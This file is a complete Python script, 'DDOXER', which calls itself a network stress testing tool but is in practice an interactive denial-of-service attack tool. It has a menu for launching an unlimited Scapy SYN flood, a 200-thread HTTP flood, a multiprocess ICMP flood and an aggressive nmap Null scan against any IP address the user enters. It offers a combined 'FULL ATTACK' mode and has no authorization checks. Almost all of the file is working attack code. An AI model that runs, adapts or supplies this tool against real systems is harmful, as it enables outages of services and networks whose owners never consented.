#!/usr/bin/env python3
"""
DDOXER - Network Stress Testing Tool
"""

import sys
import os
import random
import string
import threading
import time
import signal
import multiprocessing
import subprocess
import requests
from ping3 import ping
from scapy.all import IP, TCP, Ether, sendpfast

# DDOXER Banner
BANNER = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗██████╗         ║
║   ██╔══██╗██╔══██╗██╔═══██╗╚██╗██╔╝██╔════╝██╔══██╗        ║
║   ██║  ██║██   ██╔██║   ██║ ╚███╔╝ █████╗  ██████╔╝        ║
║   ██║  ██║██   ██╗██║   ██║ ██╔██╗ ██╔══╝  ██╔══██╗        ║
║   ██████╔╝███████║╚██████╔╝██╔╝ ██╗███████╗██║  ██║        ║
║   ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝        ║
║                                                              ║
║              Network Stress Testing Tool                     ║
║                   Version 2.0                                ║
╚══════════════════════════════════════════════════════════════╝
"""

# Configuration
TARGET_IP = "127.0.0.1"
TARGET_HTTP_HOST = "http://localhost:8000"
TARGET_PORT = 80
SCAPY_PPS = 5000
HTTP_THREADS = 200
HTTP_LOOPS_PER_THREAD = 100
HTTP_TIMEOUT = 5.0
ICMP_PROCESSES = 4
NMAP_TIMEOUT = 60

NO_ROOT_MODE = os.name != 'posix' or os.getuid() != 0

stats_lock = threading.Lock()
successful_requests = 0
failed_requests = 0

running_processes = []
attack_active = False
attack_lock = threading.Lock()

def clear_screen():
    """Clear terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_user_input(prompt, default=None, input_type=str, choices=None):
    """Get validated user input."""
    while True:
        try:
            if default is not None:
                user_input = input(f"{prompt} [{default}]: ").strip()
                if not user_input:
                    return default
            else:
                user_input = input(f"{prompt}: ").strip()
                if not user_input:
                    print("[!] Input cannot be empty!")
                    continue
            
            if choices is not None:
                if user_input not in choices:
                    print(f"[!] Invalid choice! Choose from: {', '.join(choices)}")
                    continue
            
            if input_type == int:
                return int(user_input)
            elif input_type == bool:
                return user_input.lower() in ['yes', 'y', 'true', '1']
            else:
                return user_input
        except ValueError:
            print("[!] Invalid input format!")

def setup_configuration():
    """Interactive configuration setup."""
    global TARGET_IP, TARGET_PORT, TARGET_HTTP_HOST, SCAPY_PPS
    global HTTP_THREADS, HTTP_LOOPS_PER_THREAD, HTTP_TIMEOUT, ICMP_PROCESSES, NMAP_TIMEOUT
    
    clear_screen()
    print(BANNER)
    print("\n" + "=" * 50)
    print("   DDOXER CONFIGURATION SETUP   ")
    print("=" * 50)
    print("\n[!] Press Enter to use default values\n")
    
    # Target Configuration
    print("\n--- TARGET SETTINGS ---")
    TARGET_IP = get_user_input("Target IP Address", "127.0.0.1")
    TARGET_PORT = get_user_input("Target Port", 80, int)
    TARGET_HTTP_HOST = get_user_input("HTTP Host URL", f"http://{TARGET_IP}:{TARGET_PORT}")
    
    # Attack Configuration
    print("\n--- ATTACK SETTINGS ---")
    print("[!] Higher values = More aggressive attack")
    SCAPY_PPS = get_user_input("SYN Packets Per Second (PPS)", 5000, int)
    HTTP_THREADS = get_user_input("HTTP Threads (concurrent connections)", 200, int)
    HTTP_LOOPS_PER_THREAD = get_user_input("HTTP Requests Per Thread", 100, int)
    HTTP_TIMEOUT = get_user_input("HTTP Timeout (seconds)", 5.0, float)
    ICMP_PROCESSES = get_user_input("ICMP Worker Processes", 4, int)
    NMAP_TIMEOUT = get_user_input("Nmap Scan Timeout (seconds)", 60, int)
    
    # Summary
    print("\n" + "=" * 50)
    print("   CONFIGURATION SUMMARY   ")
    print("=" * 50)
    print(f"Target IP: {TARGET_IP}")
    print(f"Target Port: {TARGET_PORT}")
    print(f"HTTP Host: {TARGET_HTTP_HOST}")
    print(f"SYN PPS: {SCAPY_PPS}")
    print(f"HTTP Threads: {HTTP_THREADS}")
    print(f"HTTP Requests/Thread: {HTTP_LOOPS_PER_THREAD}")
    print(f"HTTP Timeout: {HTTP_TIMEOUT}s")
    print(f"ICMP Processes: {ICMP_PROCESSES}")
    print(f"Nmap Timeout: {NMAP_TIMEOUT}s")
    print("=" * 50)
    
    confirm = get_user_input("\nApply these settings?", "yes", choices=['yes', 'no'])
    if confirm == 'no':
        print("[*] Restarting configuration...")
        time.sleep(1)
        setup_configuration()
    
    print("\n[+] Configuration saved successfully!")
    time.sleep(1)

def generate_random_text(length=8):
    """Generate random text for HTTP requests."""
    characters = string.ascii_lowercase + string.digits
    return "".join(random.choice(characters) for _ in range(length))

def run_nmap_scan():
    """Run nmap scan with -T5 -sN (TCP Null scan)."""
    print(f"\n[*] [Nmap Engine] Starting TCP Null scan on {TARGET_IP}...")
    print(f"[+] [Nmap] Command: nmap -T5 -sN {TARGET_IP}")
    
    try:
        cmd = ["nmap", "-T5", "-sN", TARGET_IP]
        
        # Run nmap with subprocess
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=NMAP_TIMEOUT
        )
        
        print("\n" + "=" * 50)
        print("   NMAP SCAN RESULTS (TCP Null Scan)   ")
        print("=" * 50)
        print(result.stdout)
        if result.stderr:
            print("[!] Errors/Warnings:")
            print(result.stderr)
        print("=" * 50 + "\n")
        
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        print(f"[-] Nmap scan timed out after {NMAP_TIMEOUT} seconds.")
        return False
    except FileNotFoundError:
        print("[-] Nmap not found! Please install nmap:")
        print("    Ubuntu: sudo apt-get install nmap")
        print("    Termux: pkg install nmap")
        print("    MacOS: brew install nmap")
        return False
    except Exception as e:
        print(f"[-] Nmap scan failed: {e}")
        return False

def http_worker(thread_id):
    """HTTP flood worker thread."""
    global successful_requests, failed_requests
    session = requests.Session()
    local_success = 0
    local_failed = 0
    
    for _ in range(HTTP_LOOPS_PER_THREAD):
        random_path = f"/{generate_random_text()}"
        url = f"{TARGET_HTTP_HOST}{random_path}"
        try:
            response = session.get(url, timeout=HTTP_TIMEOUT)
            if response.status_code < 500:
                local_success += 1
            else:
                local_failed += 1
        except requests.RequestException:
            local_failed += 1
    
    with stats_lock:
        successful_requests += local_success
        failed_requests += local_failed

def run_http_layer7_test():
    """Run HTTP Layer 7 attack."""
    global successful_requests, failed_requests
    successful_requests = 0
    failed_requests = 0
    
    print(f"\n[*] [HTTP Engine] Initializing {HTTP_THREADS} threads...")
    print(f"[*] Target: {TARGET_HTTP_HOST}")
    print(f"[*] Each thread will send {HTTP_LOOPS_PER_THREAD} requests")
    
    start_time = time.time()
    threads = []
    
    for t_id in range(HTTP_THREADS):
        t = threading.Thread(target=http_worker, args=(t_id,))
        threads.append(t)
        t.start()
    
    # Progress indicator
    def show_progress():
        while any(t.is_alive() for t in threads):
            with stats_lock:
                total = successful_requests + failed_requests
                print(f"\r[*] Progress: {total} requests sent...", end='', flush=True)
            time.sleep(1)
    
    progress_thread = threading.Thread(target=show_progress, daemon=True)
    progress_thread.start()
    
    for t in threads:
        t.join()
    
    end_time = time.time()
    total_time = end_time - start_time
    total_reqs = successful_requests + failed_requests
    
    print("\n" + "=" * 35)
    print("   HTTP ENGINE REPORT   ")
    print("=" * 35)
    print(f"Time Taken:           {total_time:.2f} seconds")
    print(f"Successful Hits:      {successful_requests}")
    print(f"Failed/Dropped:       {failed_requests}")
    if total_time > 0:
        print(f"Throughput Rate:      {total_reqs / total_time:.2f} req/s")
    print("=" * 35 + "\n")

def run_scapy_syn_flood():
    """Run SYN flood using Scapy."""
    if NO_ROOT_MODE:
        print("[-] SYN flood requires root privileges!")
        return False
    
    print(f"\n[*] [Scapy Engine] Preparing SYN flood...")
    print(f"[*] Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"[*] Speed: {SCAPY_PPS} packets/second")
    
    try:
        packet = Ether() / IP(dst=TARGET_IP) / TCP(dport=TARGET_PORT, flags="S")
        print(f"[+] Launching flood... (Press Ctrl+C to stop)")
        sendpfast(packet, pps=SCAPY_PPS, loop=0)
        return True
    except Exception as e:
        print(f"[-] Scapy Engine failure: {e}")
        return False

def icmp_worker(process_id, target):
    """ICMP flood worker process."""
    signal.signal(signal.SIGINT, signal.SIG_IGN)
    packet_count = 0
    while True:
        try:
            ping(target, timeout=0.1, size=64)
            packet_count += 1
            if packet_count % 500 == 0:
                print(f"\r[ICMP Worker {process_id}] Sent {packet_count} packets", end='', flush=True)
        except Exception:
            pass

def run_icmp_flood():
    """Run ICMP flood attack."""
    print(f"\n[*] [ICMP Engine] Deploying {ICMP_PROCESSES} workers...")
    print(f"[*] Target: {TARGET_IP}")
    
    processes = []
    try:
        for i in range(ICMP_PROCESSES):
            p = multiprocessing.Process(target=icmp_worker, args=(i, TARGET_IP))
            processes.append(p)
            p.start()
        
        print("[+] ICMP flood running... (Press Ctrl+C to stop)")
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print("\n[*] Stopping ICMP workers...")
        for p in processes:
            p.terminate()
            p.join()

def run_all_parallel():
    """Run all attack engines in parallel."""
    global attack_active
    print("\n" + "=" * 50)
    print("   LAUNCHING FULL ATTACK   ")
    print("=" * 50)
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"Mode: {'HTTP-ONLY' if NO_ROOT_MODE else 'FULL'}")
    print("=" * 50 + "\n")

    engines = []
    
    # Always add Nmap scan
    nmap_process = multiprocessing.Process(target=run_nmap_scan, name="Nmap-Engine")
    engines.append(nmap_process)

    if NO_ROOT_MODE:
        print("[*] No-root mode: HTTP + ICMP attacks")
        engines.append(
            multiprocessing.Process(target=run_http_layer7_test, name="HTTP-Engine")
        )
        engines.append(
            multiprocessing.Process(target=run_icmp_flood, name="ICMP-Engine")
        )
    else:
        engines.extend([
            multiprocessing.Process(target=run_scapy_syn_flood, name="Scapy-Engine"),
            multiprocessing.Process(target=run_http_layer7_test, name="HTTP-Engine"),
            multiprocessing.Process(target=run_icmp_flood, name="ICMP-Engine")
        ])

    global running_processes
    running_processes = engines
    attack_active = True

    try:
        for engine in engines:
            engine.start()
        for engine in engines:
            engine.join()
    except KeyboardInterrupt:
        print("\n[-] Interrupt received. Terminating...")
        for engine in engines:
            if engine.is_alive():
                engine.terminate()
                engine.join()
    finally:
        attack_active = False
        running_processes = []
    return True

def stop_attacks():
    """Stop all running attacks."""
    global attack_active
    with attack_lock:
        if not attack_active:
            return False
        print("\n[*] Stopping all attacks...")
        for p in running_processes:
            if p.is_alive():
                p.terminate()
                p.join()
        attack_active = False
        running_processes.clear()
        print("[+] All attacks stopped.")
    return True

def show_menu():
    """Display interactive menu."""
    clear_screen()
    print(BANNER)
    print("\n" + "=" * 50)
    print("   MAIN MENU   ")
    print("=" * 50)
    print(f"Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"Mode: {'HTTP-ONLY' if NO_ROOT_MODE else 'FULL'}")
    print(f"Attack Status: {'RUNNING' if attack_active else 'IDLE'}")
    print("=" * 50)
    print("\n[1] Start Full Attack (Nmap + SYN + HTTP + ICMP)")
    print("[2] Run Nmap Scan Only (-T5 -sN)")
    print("[3] Start HTTP Flood Only")
    print("[4] Start SYN Flood Only (requires root)")
    print("[5] Start ICMP Flood Only")
    print("[6] Stop All Attacks")
    print("[7] Show Status")
    print("[8] Configure Target")
    print("[9] Advanced Configuration")
    print("[10] Exit")
    print("\n" + "=" * 50)

def show_status():
    """Show current status with detailed statistics."""
    clear_screen()
    print(BANNER)
    print("\n" + "=" * 50)
    print("   SYSTEM STATUS   ")
    print("=" * 50)
    print(f"Target IP: {TARGET_IP}")
    print(f"Target Port: {TARGET_PORT}")
    print(f"HTTP Host: {TARGET_HTTP_HOST}")
    print(f"Running Mode: {'HTTP-ONLY (no-root)' if NO_ROOT_MODE else 'FULL (SYN+HTTP+ICMP)'}")
    print(f"Attack Active: {'YES' if attack_active else 'NO'}")
    print(f"Root Privileges: {'YES' if not NO_ROOT_MODE else 'NO'}")
    print("\n--- Attack Parameters ---")
    print(f"SYN PPS: {SCAPY_PPS}")
    print(f"HTTP Threads: {HTTP_THREADS}")
    print(f"HTTP Requests/Thread: {HTTP_LOOPS_PER_THREAD}")
    print(f"HTTP Timeout: {HTTP_TIMEOUT}s")
    print(f"ICMP Processes: {ICMP_PROCESSES}")
    print(f"Nmap Timeout: {NMAP_TIMEOUT}s")
    
    if attack_active:
        print("\n--- Live Statistics ---")
        with stats_lock:
            total = successful_requests + failed_requests
            print(f"Total HTTP Requests: {total}")
            print(f"Successful: {successful_requests}")
            print(f"Failed: {failed_requests}")
            if total > 0:
                success_rate = (successful_requests / total) * 100
                print(f"Success Rate: {success_rate:.2f}%")
    
    print("=" * 50)
    input("\nPress Enter to continue...")

def advanced_config():
    """Advanced configuration options."""
    global HTTP_TIMEOUT, HTTP_LOOPS_PER_THREAD, SCAPY_PPS, ICMP_PROCESSES, NMAP_TIMEOUT
    
    clear_screen()
    print(BANNER)
    print("\n" + "=" * 50)
    print("   ADVANCED CONFIGURATION   ")
    print("=" * 50)
    print("\nCurrent Values:")
    print(f"1. SYN PPS: {SCAPY_PPS}")
    print(f"2. HTTP Threads: {HTTP_THREADS}")
    print(f"3. HTTP Requests/Thread: {HTTP_LOOPS_PER_THREAD}")
    print(f"4. HTTP Timeout: {HTTP_TIMEOUT}s")
    print(f"5. ICMP Processes: {ICMP_PROCESSES}")
    print(f"6. Nmap Timeout: {NMAP_TIMEOUT}s")
    print("\n7. Reset to defaults")
    print("8. Back to main menu")
    
    choice = get_user_input("\nSelect option to modify", choices=['1','2','3','4','5','6','7','8'])
    
    if choice == '1':
        SCAPY_PPS = get_user_input("SYN Packets Per Second", 5000, int)
    elif choice == '2':
        HTTP_THREADS = get_user_input("HTTP Threads", 200, int)
    elif choice == '3':
        HTTP_LOOPS_PER_THREAD = get_user_input("HTTP Requests Per Thread", 100, int)
    elif choice == '4':
        HTTP_TIMEOUT = get_user_input("HTTP Timeout (seconds)", 5.0, float)
    elif choice == '5':
        ICMP_PROCESSES = get_user_input("ICMP Worker Processes", 4, int)
    elif choice == '6':
        NMAP_TIMEOUT = get_user_input("Nmap Timeout (seconds)", 60, int)
    elif choice == '7':
        SCAPY_PPS = 5000
        HTTP_THREADS = 200
        HTTP_LOOPS_PER_THREAD = 100
        HTTP_TIMEOUT = 5.0
        ICMP_PROCESSES = 4
        NMAP_TIMEOUT = 60
        print("[+] Reset to default values!")
        time.sleep(1)
    elif choice == '8':
        return
    
    print("[+] Configuration updated!")
    time.sleep(1)

def main():
    """Main interactive loop."""
    # Initial setup
    clear_screen()
    print(BANNER)
    print("\n" + "=" * 50)
    print("   WELCOME TO DDOXER   ")
    print("=" * 50)
    print(f"Running in {'HTTP-ONLY' if NO_ROOT_MODE else 'FULL'} mode")
    print(f"Root privileges: {'YES' if not NO_ROOT_MODE else 'NO'}")
    print("=" * 50)
    
    # Check if nmap is available
    try:
        subprocess.run(["nmap", "--version"], capture_output=True, check=True)
        print("[+] Nmap found!")
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[!] Warning: Nmap not found. Install with:")
        print("    Ubuntu: sudo apt-get install nmap")
        print("    Termux: pkg install nmap")
    
    # Ask for initial configuration
    if get_user_input("\nConfigure target now?", "yes", choices=['yes', 'no']) == 'yes':
        setup_configuration()
    
    print("\n[*] Starting DDOXER interactive menu...")
    time.sleep(1)
    
    while True:
        try:
            show_menu()
            choice = get_user_input("\nSelect option", choices=['1','2','3','4','5','6','7','8','9','10'])
            
            if choice == "1":
                if attack_active:
                    print("[-] Attack already running! Stop it first.")
                    time.sleep(1)
                    continue
                
                print("\n[*] Starting FULL ATTACK...")
                print("[!] Press Ctrl+C to stop all attacks")
                t = threading.Thread(target=run_all_parallel, daemon=True)
                t.start()
                print("[+] Attack launched in background!")
                time.sleep(1)
                
            elif choice == "2":
                if attack_active:
                    print("[-] Attack is running! Stop it first.")
                    time.sleep(1)
                    continue
                run_nmap_scan()
                input("\nPress Enter to continue...")
                
            elif choice == "3":
                if attack_active:
                    print("[-] Attack is running! Stop it first.")
                    time.sleep(1)
                    continue
                print("\n[*] Starting HTTP Flood...")
                t = threading.Thread(target=run_http_layer7_test, daemon=True)
                t.start()
                t.join()
                input("\nPress Enter to continue...")
                
            elif choice == "4":
                if attack_active:
                    print("[-] Attack is running! Stop it first.")
                    time.sleep(1)
                    continue
                if NO_ROOT_MODE:
                    print("[-] SYN flood requires root privileges!")
                    time.sleep(1)
                    continue
                print("\n[*] Starting SYN Flood...")
                t = threading.Thread(target=run_scapy_syn_flood, daemon=True)
                t.start()
                t.join()
                input("\nPress Enter to continue...")
                
            elif choice == "5":
                if attack_active:
                    print("[-] Attack is running! Stop it first.")
                    time.sleep(1)
                    continue
                print("\n[*] Starting ICMP Flood...")
                print("[!] Press Ctrl+C to stop")
                t = threading.Thread(target=run_icmp_flood, daemon=True)
                t.start()
                t.join()
                input("\nPress Enter to continue...")
                
            elif choice == "6":
                if stop_attacks():
                    print("[+] All attacks stopped.")
                else:
                    print("[*] No attack is running.")
                time.sleep(1)
                
            elif choice == "7":
                show_status()
                
            elif choice == "8":
                setup_configuration()
                
            elif choice == "9":
                advanced_config()
                
            elif choice == "10":
                if attack_active:
                    print("[*] Stopping attacks before exit...")
                    stop_attacks()
                print("\n[*] Thank you for using DDOXER!")
                print("[*] Exiting...")
                time.sleep(1)
                clear_screen()
                sys.exit(0)
                
        except KeyboardInterrupt:
            print("\n\n[*] Interrupt received. Cleaning up...")
            if attack_active:
                stop_attacks()
            print("[*] Exiting DDOXER...")
            time.sleep(1)
            clear_screen()
            sys.exit(0)
        except Exception as e:
            print(f"[-] Error: {e}")
            time.sleep(1)
            continue

if __name__ == "__main__":
    main()
